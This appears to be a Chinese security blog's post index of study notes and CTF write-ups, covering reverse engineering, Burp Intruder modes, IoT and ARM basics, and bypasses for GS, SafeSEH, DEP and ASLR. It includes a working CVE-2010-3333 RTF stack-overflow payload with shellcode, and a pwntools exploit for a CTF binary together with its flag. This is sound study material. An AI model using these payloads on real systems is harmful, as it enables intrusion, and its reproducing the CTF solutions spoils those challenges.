windows_re2","slug":"DDCTF2019re","date":"2022-08-09T03:33:43.559Z","updated":"2022-08-11T14:22:40.890Z","comments":true,"path":"2022/08/09/DDCTF2019re/","link":"","permalink":"https://sinky.top/2022/08/09/DDCTF2019re/","excerpt":"","text":"esp定律脱壳Aspack，然后ida分析一波。 1234567891011121314151617181920212223242526272829int sub_401320(){ char v1; // [esp+8h] [ebp-C04h] char v2; // [esp+9h] [ebp-C03h] char v3; // [esp+408h] [ebp-804h] char v4; // [esp+409h] [ebp-803h] char v5; // [esp+808h] [ebp-404h] char v6; // [esp+809h] [ebp-403h] v3 = 0; sub_401C6A(&amp;v4, 0, 0x3FF); v5 = 0; sub_401C6A(&amp;v6, 0, 0x3FF); MEMORY[0x785520C1](\"input code:\"); MEMORY[0x785526D4](\"%s\", &amp;v3); if ( !(unsigned __int8)sub_4011F0() ) { MEMORY[0x785520C1](\"invalid input\\n\"); MEMORY[0x78542455](0); } sub_401240(&amp;v5); v1 = 0; sub_401C6A(&amp;v2, 0, 0x3FF); MEMORY[0x78552E73](&amp;v1, \"DDCTF{%s}\", &amp;v5); if ( !strcmp(&amp;v1, \"DDCTF{reverse+}\") ) MEMORY[0x785520C1](\"You've got it !!! %s\\n\", &amp;v1); else MEMORY[0x785520C1](\"Something wrong. Try again...\\n\"); return 0;} 限制输入0-9,A-F,可想到十六进制 输入字符经过变换与“DDCTF{reverse+}”对比，相同则成功。 先尝试输入字符串1234567AAA,得到加密后字符 EjRWeqo=,看着像base664,直接base64转成十六进制尝试，发现得到了我输入字符串。将reverse+转换得到flag","categories":[],"tags":[{"name":"RE","slug":"RE","permalink":"https://sinky.top/tags/RE/"},{"name":"ctf","slug":"ctf","permalink":"https://sinky.top/tags/ctf/"}]},{"title":"CVE-2020-6418","slug":"CVE-2020-6418","date":"2022-08-09T03:33:40.197Z","updated":"2022-08-09T03:29:41.243Z","comments":true,"path":"2022/08/09/CVE-2020-6418/","link":"","permalink":"https://sinky.top/2022/08/09/CVE-2020-6418/","excerpt":"","text":"背景(资料来自绿盟科技) 2020年2月24日，google针对桌面版chrome浏览器发布更新以解决多个漏洞，包括已被发现的在野利用的高危漏洞CVE-2020-6418. CVE-2020-6418存在于V8中的类型混淆漏洞，V8是chrome的开源JavaScript和WebAssembly引擎，该洞由Google威胁分析小组的Clement Lecigne发现并上报。 受影响产品版本： Google Chrome Version&lt;80.0.3987.122 适用于windows,Mac,Linux. 参考http://blog.nsfocus.net/cve-2020-6418","categories":[],"tags":[{"name":"chrome调试","slug":"chrome调试","permalink":"https://sinky.top/tags/chrome%E8%B0%83%E8%AF%95/"}]},{"title":"burp四种密码爆破模式学习","slug":"bp四种密码爆破模式学习","date":"2022-08-09T03:24:09.328Z","updated":"2022-08-11T14:22:53.458Z","comments":true,"path":"2022/08/09/bp四种密码爆破模式学习/","link":"","permalink":"https://sinky.top/2022/08/09/bp%E5%9B%9B%E7%A7%8D%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4%E6%A8%A1%E5%BC%8F%E5%AD%A6%E4%B9%A0/","excerpt":"","text":"Sniper:单参数爆破，多参数时同一个字典按顺序替换各参数，初始值有一个参数不变 Battering ram:多参数同时爆破，但用的是同一个字典 Pitchfork:多参数同时爆破，但用的是不同的字典 Cluster bamb:多参数做笛卡尔乘积模式爆破 Sniper(狙击手)（一对一） 一个参数a，若payload有x个，则执行x次。 两个参数a、b,先执行爆破a的x次，再执行b的y次，共x+y次爆破。 此模式主要适用于：竞争条件测试(选择NULL payloads)，密码、验证码暴力破解，重放攻击等场景 Battering ram(破城槌)（payload一对多） 一个参数a，若payload有x个，则执行x次。 两个参数a、b,payload被同事放到a、b变量中。适合需要在请求中把相同的输入放到多个位置的情况。 此模式主要适用于：撞库 Pitchfork(音叉)可以多组密码本payload a:1,2 b:3,4 第一次爆破为 1，3 第二次爆破为 2，4 此模式主要适用于：恶意注册 Cluster bomb(集束炸弹)（多对多） 对payload组进行笛卡尔积，交叉组合，即a的一个payload值与b的每一个值进行组合爆破。","categories":[],"tags":[{"name":"bp","slug":"bp","permalink":"https://sinky.top/tags/bp/"},{"name":"WEB","slug":"WEB","permalink":"https://sinky.top/tags/WEB/"}]},{"title":"《物联网渗透测试》学习笔记1","slug":"《物联网渗透测试》学习笔记1","date":"2022-08-09T03:24:06.948Z","updated":"2022-08-11T14:23:13.817Z","comments":true,"path":"2022/08/09/《物联网渗透测试》学习笔记1/","link":"","permalink":"https://sinky.top/2022/08/09/%E3%80%8A%E7%89%A9%E8%81%94%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E3%80%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/","excerpt":"","text":"0x01 IOT渗透测试定义IoT生态系统与渗透测试生命周期 渗透测试方法： 黑盒测试 白盒测试 灰盒测试 固件入门固件是一种写入硬件设备的软件，作用是对应用和各项系统功能实施控制，运行固件的设备称为嵌入式系统。 固件通常由bootloader、内核、文件系统以及其他资源组成， 固件组成：闪存、bootloader、内核、根文件系统。 bootloader:主要作用包括RAM初始化（目的是存储易失性数据）、串口初始化、机器类型检测、内核参数链表设置、initramfs(基于RAM的初始文件系统)加载以及内核镜像调用等。ARM、MIPS架构中部分常见的bootloader包括：Redboot、u-boot以及barebox等。当bootloader启动内核之后，文件系统就完成了加载。 固件可以采用的文件系统类型：SquashFS、cramFS、JFFS2、YAFFS2以及ext2等。 IoT中的Web应用通常嵌入书web应用被设计为在自包含的环境中运行 目前iot领域主要有两种不同的web应用模型 混合云模型：包含厂商或供应商提供的基于软件即服务的web应用，作用是同运行在嵌入式设备固件中的web应用程序建立连接，将数据从厂商的云服务器中同步到本地网络的嵌入式设备中。 独立嵌入式服务器模型 web通信：浏览器、、嵌入式服务器和web应用服务器之间的通信通常要么借助简单对象访问协议（SOAP）/XML等web服务，要么借助基于http/htps复合REST规范的API来实现。 硬件设备基础硬件输入： EEPROM，是非易失性存储器。以单个字节为单位进行读写，可通过电荷或紫外线照射擦除数据。读写次数有限。 NAND闪存以区块为单位读写。存储设备的boootloader。 UART接口是访问设备最为常见的方式。连接改接口后即可获得root权限。PCB上UART接口的引脚定义中包括Tx、Rx、Vcc和GND 4个引脚。连接UART接口前需要使用万用表识别出引脚。 JTAG接口是遵循IEEE 1149.1标准的另一种国际标准测试协议。用于芯片级和系统级的测试。，包含5个引脚：TDI、TDO、TMS、TCK、TRST.可以接到芯片的tap（测试访问口） IoT无线通信简介最常用协议：Wi-Fi(802.11)、ZigBee(802.15.4)、Z-Ware、蓝牙(802.15.1)、低功耗蓝牙。 IoT威胁建模","categories":[],"tags":[{"name":"IOT","slug":"IOT","permalink":"https://sinky.top/tags/IOT/"},{"name":"学习笔记","slug":"学习笔记","permalink":"https://sinky.top/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}]},{"title":"《ARM嵌入式Linux系统开发详解》学习笔记1","slug":"《ARM嵌入式Linux系统开发》学习笔记1","date":"2022-08-09T03:21:41.844Z","updated":"2022-08-09T03:22:14.420Z","comments":true,"path":"2022/08/09/《ARM嵌入式Linux系统开发》学习笔记1/","link":"","permalink":"https://sinky.top/2022/08/09/%E3%80%8AARM%E5%B5%8C%E5%85%A5%E5%BC%8FLinux%E7%B3%BB%E7%BB%9F%E5%BC%80%E5%8F%91%E3%80%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/","excerpt":"","text":"0x01 嵌入式系统入门什么是嵌入式系统： 一种为特定设备服务的，软件硬件可裁剪的计算机系统，形式变化多样、体积小。如手机、微波炉，对于手机、微波炉来说，需要小型计算机来控制，换句话，是需要把计算机全入到手机和微波炉里，也就是嵌入式系统，不需要严格地响应时间和数据吞吐量，最关键的是能够缩小体积以及功能专门化，嵌入式系统种类繁多，按照系统硬件的核心处理器来说可以分成嵌入式微控制器和嵌入式微处理器。 嵌入式微控制器： 嵌入式微控制器也就是传统意义上的单片机，是目前嵌入式系统的前身。单片机就是把一个计算机的主要功能集成到一个芯片上，即一个芯片就是一个计算机，体积小、结构简单、便于开发以及价格经济。 通常一个单片机芯片包含运算处理单元、ARM、Flash存储器以及外部接口，通过外部接口可以输出或者输入心寒，控制相应的设备，用户可以把编写好的代码烧写到单片机芯片内部来控制外部设备。 嵌入式微处理器： 单片机处理能力低，嵌入式微处理器是最近几年随着大规模集成电路发展同步，处理能力更强，目前主流嵌入式微处理器都是32位，而单片机多是8位和16位。 典型嵌入式系统组成： 嵌入式系统与传统PC一样，也是一种及计算机系统，由硬件和软件组成，硬件包括嵌入式微控制器和微处理器，以及一些外围元器件和外部设备；软件包括嵌入式操作系统和应用软件。 嵌入式系统种类繁多，不同的嵌入式系统软、硬件很难兼容，软件必须修改而硬件必须重新设计才能使用。 典型嵌入式系统: 硬件： 嵌入式处理器：处理器是整个系统的核心，负责处理所有的软件程序以及外部设备的信号 外部设备：在不同系统中有不同选择。 软件： 嵌入式操作系统：是软硬件的接口，负责管理系统的所有软件和硬件资源，还可以通过驱动程序与外部设备打交道。 应用软件：利用操作系统提供的功能开发出针对某个需求的程序，供用户使用。 0x02 嵌入式软硬件系统数字电路是计算机的基础。 进制转换 计算机组成原理 直接内存访问：DMA 软件：系统软件、应用软件 软件开发：需求分析、概要设计和详细设计、编码和调试、测试和维护。 常见软件开发模型：瀑布开发模型、增量开发模型、统一软件开发模型。 操作系统的基本结构都是内核、驱动程序、程序库。 0x03 ARM处理器 微处理器 通用微处理器：用于高性能计算 嵌入式微处理器：针对某种特定应用的高能力计算 微控制器：用于控制某种设备，通常集成了多种外部设备控制器，处理指令能力不强但价格低廉。 ARM:高性能RISC机器。 芯片体积小，功耗低，成本低性能优异 支持Thumb(16位)和ARM(32位) 内部大量使用寄存器，执行指令速度快。 大部分指令是操作寄存器，很少访问外部内存 采用多级流水线结构处理速度快。 多种寻址方式，数据存取方式灵活 指令长度固定，便于编译器操作以及执行指令 ARM指令集 算术运算指令 ADD:加法运算 add dest,op1,op2 //dest是目的寄存器，op1 op2是操作数,dest=op1+op2 ADC:带进位加法 ADC dest,op1,op2 SUB:减法 sub dest,op1,op2 dest=op1-op2 SBC：带进位减法 逻辑运算指令 AND:逻辑与(1 1为1，0 0为1，1 0为0) and dest,op1,op2 dest=op1 and op2 EOR:异或（1 1为0，0 0为0，10为1） MOV:复制数据 mov dest,op1 dest=op1 mov r0,r0,LSL#3//r0=r0*8,LSL寄存器左移三位，即乘以8 分支指令 B:跳转 b 地址 //跳转到指定地址 数据传送指令 单一数据传送指令：向内存装载和存储一个字节或一个字长的数据 LDR Rd,地址 STR Rd,地址 LDR B Rd,地址 STR B Rd,地址 多数据传送指令：向内存装载和存储多个字节或字的数据 xxM Rn(!),&lt;寄存器列表&gt;{^} xx:LD–装载，ST–存储 LDMED LDMIB//++i LDMFD LDMIA//i++ LDMEA LDMDB//++*i LDMFA LDMDA//*i++ STMFA STMIB//存储前增加地址 STMEA STMIA//存储后增加地址 STMFD STMDB//存储前增加值 STMED STMDA//存储后增加值 ARM状态：0位表示ARM状态，1位表示Thumb状态,BX指令切换状态。 MMU:内存管理单元。 LSL:逻辑左移，二进制从右往左移动，空位补0（就是原数值乘以2的移位次方）LSR:逻辑右移，二进制从左往右，空位补0ASR:算术右移，符号位不变，高位空出补0，低位补1ROR:循环右移，低位移到高位RRX:带扩展的循环右移：操作数右移一位，高端空出位用原C标志值填充 寻址方式 立即寻址:用#表示数值 subs r0,#1;r0=r0-1 mov r0,#0xff00;r0=0xff00 寄存器寻址方式：读取寄存器得到操作数 mov r1,r2;r1=r2 sub r0,r1,r2;r0=r1-r2 寄存器偏移寻址：寄存器的值移位得结果 mov r0,r1,LSL #3;r0=r1*8 ands r0,r2,LSL #3;r0= r2*8 and r1 寄存器间接寻址：寄存器为地址，从对应内存重取出数据 LDR r0,[r1];r1为地址，从内存中取出数据存入r0 SWP r0,r0,[r1];r1为地址，从内存中取出数据与r0交换 基址寻址：把寄存器内容与指定便宜相加，得数据地址，后从内存中取出数据 LDR r0,[r1,#0xf];r1数值与0xf相加得到数据地址 STR r0,[r1,#-2];r1数值-2得到数据地址 多寄存器寻址：一次传输多个寄存器值 LDMIA r1!,{r2r7,r12};r1单元重数据读到r2r7和r12,r1指定地址自动加1 栈寻址：先进后出，通过栈指针寄存器寻址 STMFD SP!,{R0R7,LR};r0r7和LR的内容压入堆栈 LDMFD SP!,{r0r7,LR};从堆栈中取出数据到r0r7和LR 0x04 嵌入式Linux一般来说，嵌入式操作系统是由启动程序、核心、根文件系统组成，通过特殊的烧录工具将编译好的嵌入式系统文件影像烧写到目标板的只读存储器（ROM）或Flash存储器中。 0x05 建立软件开发环境 运行在windows平台下得到Linux系统模拟环境：Cygwin. linux下：串口工具minicom windows下：串口工具xshell ARM集成开发环境ADS c语言编译器armcc c++语言编译器armcpp 0x06 第一个linux应用程序 vi创建源代码文件hello.c gcc -c hello.c 编译运行 0x07 Linux应用程序编程基础 堆栈 内存管理函数 malloc():分配内存，不能初始化内存空间 free()：释放malloc()分配的内存 实用的内存分配函数 calloc():分配一块新内存，向应用程序分诶内存，分配后会初始化新分配的内存空间 realloc():改变一块已经分配的内存大小，函数调整后的内存空间起始地址有可能与原来的不同，所以需要realloc()函数的返回值。 文件指针和流：FILE*fp getc() /fgetc() /getchar() POSIX文件I/O编程 POSIX可移植操作系统接口 open() /creat() /close() /read() /write() /fcnt()修改一打开文件属性 文件头： &lt;sys/types.h&gt; &lt;sys/stat.h&gt; &lt;fcntl.h&gt; 0x08 开发多进程/线程程序 PCB进程控制块 fork()调用创建进程 退出进程：exit()、_exit()、atexit()、on_exit(). 常用进程间通信方法： 管道：单方向传送数据，只能在有共同父进程的进程间使用 pipe()函数：创建管道 #include&lt;unistd.h&gt; int pipe(int filedes[1]); 共享内存：不同进程可访问 int shmget():创建 void *shmat：获得一个共享内存ID对应的内存其实地址 int shmdt：从程序中分立一块共享内存 FIFO 消息队列 信号量 共享存储 socker Linux的多进程和多线程 0x09 网络通信应用 TCP/IP协议簇 IP协议：在传输层，负责数据包的传输管理 实现两个功能：寻址和分段","categories":[],"tags":[{"name":"学习笔记","slug":"学习笔记","permalink":"https://sinky.top/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}]},{"title":"漏洞战争学习笔记2：CVE-2010-3333","slug":"漏洞战争学习笔记2：CVE-2010-3333","date":"2022-08-09T03:17:04.198Z","updated":"2022-08-09T04:19:33.523Z","comments":true,"path":"2022/08/09/漏洞战争学习笔记2：CVE-2010-3333/","link":"","permalink":"https://sinky.top/2022/08/09/%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B02%EF%BC%9ACVE-2010-3333/","excerpt":"","text":"0x01 分析环境os:由于笔者实在没有找到大佬们使用的目标文件office word 2003 11.5604.5606,只有11.8169.8172，但是应该只要是2003 sp3的应该就问题不大。 操作系统：windows XP SP3虚拟机：VM调试器：WinDbg、OD、IDAoffice:office word 2003 11.8169.8172 0x02 漏洞描述oddice xp sp3、2003 sp3、2007 sp2、2010等多个版本的office软件中的Open XML文件格式转换器存在栈溢出漏洞，主要是在处理RTF的”pFragments”属性时存在栈溢出，导致远程攻击者可以借助特制的RTF数据执行任意代码，因此该漏洞又名”RTF栈缓冲区溢出漏洞”。 office word 2003中的MSO.dll库在解析RTF文档的绘图pFRagments属性时完全信任其数据，未做任何检查便将数据复制到栈中，存在了栈溢出的可能，导致用户打开精心构造的RTF文件时就有可能导致执行任意代码。 0x03 分析过程用Metasploit生成测试样本msf.rtf。 运行WinDbg附加Word 2003，但是每次都是还没有打开测试样本的时候，windbg就已经报错了，我裂开了呀。然后看报错是ntdll.dll文件符号文件无法找到，那我下载一个弄，结果并没有缺失，我又裂开了！ [待续] 打开测试样本，WinDbg捕获异常，循环赋值内存数据到栈空间时，未检测复制的内存大小，导致覆盖到edi（0x130000）开始的不可写页面,触发异常的指令位于30e9eb88,当前栈已被样本生成的垃圾数据覆盖。 g kb 在30e9eb88处下断，重新打开测试样本，断下来后通过kb指令得到的信息进行回溯，结合IDA，可知调用函数及其执行流程：30f4cc5d-&gt;30f4cc93 call 30e9eb62-&gt;30e9eb88 通过跟踪分析可发现，复制的数据大小由样本中的某一处决定，如下面两张图，前面的4在后面的计算中会变成0，并且将c8ac除以4（因为操作的大小为DWORD p 为了确定该栈溢出漏洞能劫持程序运行流程，自己构造一个长度偏小（防止触发访问异常）但又能覆盖返回地址的测试样本, 打开该样本，WinDbg捕获异常，eip已被改为111111，至此我们可以确定该栈溢出漏洞可被利用 0x04 漏洞利用覆盖返回地址找到覆盖成返回地址的地方，修改成0x7ffa4512（jmp esp），再在后面添加一些0x90，然后运行起来还没到执行到栈中就会崩溃，推测前面测试样本太小没怎么污染到栈空间，一开始还想着还原栈空间，但是重新分析了测试样本后发现其在下图中30F4CB29处是实现跳转的，而加了一些0x90后不跳转，并进行了一些与栈相关的操作，从而导致崩溃 布置shellcode分析了下，是栈中多了一些0x90导致原来的一堆00不见了，所以需要在返回地址后面加40个00，这样就可以执行到栈中了。在后面加入shellcode，重新运行并成功进入shellcode，布置shellcode如下： z{\\rtf1{}{\\shp{*\\shpinst{\\sp{\\sn pfragments}{\\sv1;1;11111111111111111111111111111111111111111111111111111245fa7f0000000000000000000000000000000000000000fc686a0a381e686389d14f683274910c8bf48d7ef433dbb7042be366bb33325368757365725433d2648b5a308b4b0c8b491c8b098b6908ad3d6a0a381e750595ff57f895608b453c8b4c057803cd8b592003dd33ff478b34bb03f5990fbe063ac47408c1ca0703d046ebf13b54241c75e48b592403dd668b3c7b8b591c03dd032cbb955fab57613d6a0a381e75a933db536875730000687267656f68524e476f8bc453505053ff57fc53ff57f8}}}}}```","categories":[],"tags":[{"name":"漏洞战争","slug":"漏洞战争","permalink":"https://sinky.top/tags/%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89/"}]},{"title":"各类型软件漏洞合集","slug":"类型漏洞合集","date":"2022-08-09T03:17:04.198Z","updated":"2022-08-09T04:18:23.849Z","comments":true,"path":"2022/08/09/类型漏洞合集/","link":"","permalink":"https://sinky.top/2022/08/09/%E7%B1%BB%E5%9E%8B%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/","excerpt":"","text":"0x01 格式化串漏洞介绍格式化串漏洞产生于数据输出函数中对输出格式解析的缺陷。当输入输出函数的格式控制符能够被外界影响时，攻击者可以利用读写内存的方法修改函数返回地址，劫持进程，使shellcoed得到执行。 此类漏洞发生条件苛刻，实际案例很少。 能够引起此漏洞的函数1234567891011int printf(const char* format [,argument]...);int wprintf(const wchar_t* format [,argument]...);int fwprintf(FILE* stream,const wchar_t* format [,argument]...);int sprintf(char buffer,const char* format [,argument]...);int swprintf(wchar_t *buffer,const wchar_t *format [,argument]...);int vprintf(const char* format,va_list argptr );int vwprintf(const wchar_t* format,va_list argptr );int vfprintf(FILE *stream,const char* format,va_list argptr );int vfwprintf(FILE *stream,const wchar_t* format,va_list argptr );int vsprintf(char *buffer,const char* format,va_list argptr );int vswprintf(wchar_t *buffer,const wchar_t* format,va_list argptr ); 0x02 GS安全编译选项保护介绍在所有函数调用发生时，GS编译选项会向栈帧内压入一个额外的随机DWORD,这个随机数被称为canary，在EBP前，系统在.data内存区存放了canary副本，函数返回前系统会执行安全验证操作，比较栈帧中canary与内存区副本是否一致，不一致则证明发生溢出，系统将进行异常处理。 以下情况不会应用GS 函数不包含缓冲区 函数被定义为具有变量参数列表 函数使用无保护的关键字标记 函数在第一个语句中包含内嵌汇编代码 缓冲区不是8字节类型且大小不大于4个字节。 典型突破GS的方法利用未保护的内存为了将GS对性能的影响降到最小，并不会所有的函数都会被保护，我们可以利用一些未被保护的函数绕过GS保护。 例子：函数中不包含4字节以上的缓冲区，不受到GS保护，函数返回前未进行任何安全检测，可以覆盖返回地址。 mov esp,ebp pop ebp retn``` ### 覆盖虚函数 程序只有在函数返回时才会check，而在此之前没有任何检查措施，我们可以在程序检查cookie之前劫持程序流程，实现溢出。 &gt; 例子：利用C++的虚函数来绕过GS机制。 &gt;&gt; 当函数中存在溢出，可能会影响到虚表指针，继而可以控制虚表指针使其指向我们可以控制的内存空间。 &gt; 虚函数实现过程：程序根据虚表指针找到虚表，然后从虚表中取出要调用的虚函数地址，根据地址转入虚函数执行。 ### 攻击异常处理 GS对S.E.H没有提供保护。我们可以通过攻击异常处理绕过GS. 通过超长字符串覆盖掉异常处理函数指针，想办法触发一个异常，程序就会转入异常处理，由于异常处理函数指针已经被覆盖，我们就可以通过劫持S.E.H来控制程序的后续流程。 ### 同时替换栈中和.data中的Cookie cookie的生成具有很强的随机性，因为才出来基本不可能。同时替换栈中和.data中的cookie保证溢出后的一致性。 &gt; 例子：将shellcode赋值为8个0x90,OD运行断在test函数的if语句处，从if_addr取出cookie，与ebp异或后放入ebp-4的位置去。（函数返回前的校验过程：程序从ebp-4的位置取出cookie,与ebp异或后与if_addr处cookie比较一致性），如此.data中cookie成功修改为0x90. &gt; 接下来控制栈中cookie，通过超长字符串覆盖变量，修改cookie。 &gt; 布置shellcode:首先放4个0x90用于修改if_addr，然后跟着弹出“failwest”的机器码，然后用0x90填充至cookie的位置，接下来跟着90909090与当前ebp异或的结果，最后再加上4个字节的填充和shellcode起始地址(用来覆盖函数返回地址) # 0x03 SafeSEH：对异常处理的保护机制 在程序调用异常处理函数前，对要调用的异常处理函数进行校验，当发现函数不可靠将终止异常处理函数的调用。 ## 校验流程 异常处理函数的调用是通过RtlDispatchException()函数处理实现，SafeSEH机制也是从此处开始。其校验流程如下： * 检查异常处理链是否位于当前程序的栈中 * 异常处理指针是否指向当前程序栈中 * 调用函数RtlIsVaildHandler()对异常处理函数进行校验 * 异常处理函数地址是否在加载模块的内存空间 * 判断程序是否设置了IMAGE_DLLCHARACTERISTICS_NO_SEH标识（标识被设置，函数返回校验失败） * 程序中是否包含安全S.E.H表，将异常处理函数地址与该表匹配，成功则继续 * 判断是否设置ILonly标识。（设置此标识，证明该程序只包含.NET编译人中间语言，校验失败） * 判断异常处理函数地址是否位于不可执行页上，位于，则检测DEP是否开启，未开启则校验成功 * 判断系统是否允许跳转到加载模块的内存空间外执行，允许则返回成功 &gt; RtlIsVaildHandler()允许异常处理函数执行的情况： &gt;&gt; 异常处理函数位于加载模块内存范围之外，DEP关闭 &gt;&gt; 异常处理函数位于加载模块内存范围之内，相应模块未启用SafeSEH，且模块不是纯IL（中间语言）. &gt;&gt; 异常处理函数位于加载模块内存范围之内，相应模块未启用SafeSEH，异常处理函数地址包含在安全SEH表中。 ## 绕过SafeSEH（不考虑DEP影响） * 攻击返回地址绕过。 * 一个程序启用了SafeSEH但是未启用GS(或被攻击函数不受到GS保护)，攻击函数返回地址 * 利用虚函数绕过 * 从堆中绕过 * 利用未启用SafeSEH模块绕过 * 利用加载模块之外的地址绕过SafeSEH * # 0x04 DEP ## 介绍 溢出攻击的根源在于现代计算机对数据和代码没有明确区分这一先天缺陷，DEP(数据执行保护)就是用来弥补计算机对数据和代码混淆这一天然缺陷。 DEP基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。 DEP主要作用是阻止数据页执行代码，分为软件DEP和硬件DEP. 软件DEP即SafeSEH，与CPU硬件无关。 硬件DEP是由Windows利用软件模拟实现，对操作系统提供一定的保护。（硬件DEP才是真正的DEP,需要CPU支持，AMD称之为NX，Intel称之为XD） ## 攻击DEP方法 ### 攻击未启用DEP程序 ### 利用Ret2Libc挑战DEP ret2libc是return-to-libc的缩写，由于DEP不允许我们直接到非可执行也执行指令，我们需要在其他可执行的位置找到符合我们要求的指令，让这条指令替我们工作，为了控制此条指令，在指令执行后还需要一个返回指令，以便回收程序的控制权。 #### 三种相对有效的绕过DEP的exploit方法 * 通过跳转到ZwSetInformationProcess函数将DEP关闭后再转入shellcode执行 * 通过跳转到VirtualProtect函数来将shellcode所在内存页设置为可执行状态，然后在转入shellcode执行 * 通过跳转到VIrtualAlloc函数开辟一段具有执行权限的内存空间建，然后将shellcode复制到这段内存中执行 ### 利用可执行内存挑战DEP 有时候在进程的内存空间中会存在一段可读可写可执行的内存，如果能够将shellcode复制到这段内存中，并劫持程序流程，我们的shellcode就有执行的机会。此处需要一些运气，然而我在做实验上一向运气很差……,如果被攻击的程序内存空间中存在这样一个可执行的数据区域，就可以直接通过memcpy函数将shellcode复制到这段内存区域中执行。 ### 利用.NET挑战DEP .NET的文件具有和PE文件一样的结构，即也具有.text等段，这些段会被映射到内存中，也会具有一定的可执行属性。将shellcode放到.NET中具有可执行属性的段中，然后让程序转入这个区域执行，就可以执行shellcode了。 ### 利用java applet挑战DEP java applet与.NET类似，都可以被IE浏览器加载到客户端，而且加载到IE进程的内存空间后这些控件所在内存空间都具有可执行属性。 # 0x05 ASLR ## 介绍 ASLR,通过加载程序的时候不再使用固定的基址加载，从而干扰shellcode定位的一种保护机制。包含了映像随机化、堆栈随机化、PEB与TEB随机化。 （支持ASLR的程序在它的PE头中会设置IMAGE_DLL_CHARACTERISITCS_DYNAMIC_BASE标识来说明，编译程序时启用/dynmicbase链接选项就可以支持ASLR了） ### 映像随机化 在PE文件映射到内存中，对其加载的虚拟地址进行随机化处理，这个地址是在系统启动时确定的，系统重启红藕这个地址会变化。 映像随机化只对加载基址的前2个字节做了随机处理。 ### 堆栈随机化 在程序运行时随机的选择堆栈基址，堆栈基址在打开程序的时候确定。 ### PEB和TEB随机化 TEB存放在FS:0和FS:[0x18]处，PEB存放在TEB偏移0x30的位置。 ## 攻击方式 ### 攻击未启用ASLR模块 ASLR仅仅是安全机制，不支持ASLR的软件很多，这意味着加载基址固定，在当前进程找到这样的模块就可以利用它里面的指令作为跳板直接无视ASLR. 如：Adobe Flash Player ActiveX ### 利用部分覆盖进行定位内存地址 之前说过，映像随机化只是对映像加载基址的前2个字节做随机化处理，我们可覆盖这个地址的最后几个固定字节，就可以在一定范围内控制程序。 采用这种类似相对寻址方法来动态确定跳板指令的地址以实现调班指令的通用性。 ### 利用Heap spray技术定位内存地址 Heap spray原理：通过申请大量的内存，占领内存中的0x0C0C0C0C的位置，并在这些内存中放置0x90和shellcode，最后控制程序转入0x0C0C0C0C执行。 ### 利用Java applet heap spray技术定位内存地址 ### 为.NET控件禁用ASLR","categories":[],"tags":[{"name":"漏洞","slug":"漏洞","permalink":"https://sinky.top/tags/%E6%BC%8F%E6%B4%9E/"}]},{"title":"攻防世界 int_overflow","slug":"攻防世界pwn-int_overflow","date":"2022-08-09T03:17:04.192Z","updated":"2022-08-11T14:23:43.216Z","comments":true,"path":"2022/08/09/攻防世界pwn-int_overflow/","link":"","permalink":"https://sinky.top/2022/08/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn-int_overflow/","excerpt":"","text":"checksec 查看保护机制 可直接使用栈溢出；基地址不变化；栈中数据有执行权限； 分析思路32位文件，按流程查看程序，main()无突破点。 进入login(),限制username长度最大0x19;限制passwd长度最大0x199； 进入check_passwd()，v3存储passwd长度，满足if语句3&lt;v3&lt;=8可跳到else语句。 此处有突破点：v3类型为unsigned __int8,，取值范围0~255，而v3存储的passwd最大为0x199,即409.远大于v3取值范围。此处为典型整数溢出。 综上:if语句中的v3范围为（3,8]或[259,264] （最大为255，若使其溢出，则需再加四字节，__int8 是指8bit） 溢出之后到达else语句，函数返回 strcpy(dest,s)，dest为字符串拷贝目的栈，长度为0x14。 在字符串中发现cat flag,属于函数 what_is_this()，地址为0x0804868B. 攻击思路可以利用栈溢出，令passwd直接覆盖dest,直接使函数返回what_is_this()。 在字符拷贝过程中，输入0x14个字符，可覆盖函数返回地址，具体是否为0x14个字符，现在查看汇编语言： 在字符串拷贝前，先将拷贝原地址和目的地址压入堆栈，在函数最开始压入ebp变量，在函数结尾存在leave指令，在32位程序中，leave指令等于mov esp,ebp和pop ebp。即：在覆盖函数返回地址前，还有一次出栈操作，数值4字节。即覆盖之前还需将这4字节覆盖。随机选取数值262.（what_is_this()函数的地址为4字节） 262-0x14-4-4=234 或者，我在gdb中调试程序，在strcpy下断点，passwd填上‘a’*262，观察到ebp值为4字节。 exp: 1234567891011from pwn import*sh=remote('111.198.29.45',39118)sh.recvuntil('Your choice:')flag=0x0804868Bsh.sendline('1')sh.recvuntil('username:')sh.sendline('z')sh.recvuntil('passwd:')payload='a'*0x14+'aaaa'+p32(flag)+'a'*234sh.sendline(payload)sh.interactive() cyberpeace{2a2d92a084e034be9c3a03bbab4f149b}","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://sinky.top/tags/ctf/"},{"name":"pwn","slug":"pwn","permalink":"https://sinky.top/tags/pwn/"}]},{"title":"攻防世界 guess_num","slug":"攻防世界pwn-guess_num","date":"2022-08-09T03:17:04.190Z","updated":"2022-08-11T14:23:36.259Z","comments":true,"path":"2022/08/09/攻防世界pwn-guess_num/","link":"","permalink":"https://sinky.top/2022/08/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn-guess_num/","excerpt":"","text":"查看关键main()函数，发现gets(&amp;v11)存在栈溢出 进入sub_C3E()函数，确定满足条件即可cat flag。 题目要求，先输入name,然后连续十次猜对数字得到flag, 进入V11,在栈中占0x20，可以覆盖到seed，使seed[0]已知，后使输入的v8等于随机数v10,拿到flag。 注：（1）在调用rang()时，先利用srand()设好随机数种子，若未设置，rand()在调用的时候会自动设为1.（2）libc共享库：可以使用命令 ldd guess_num 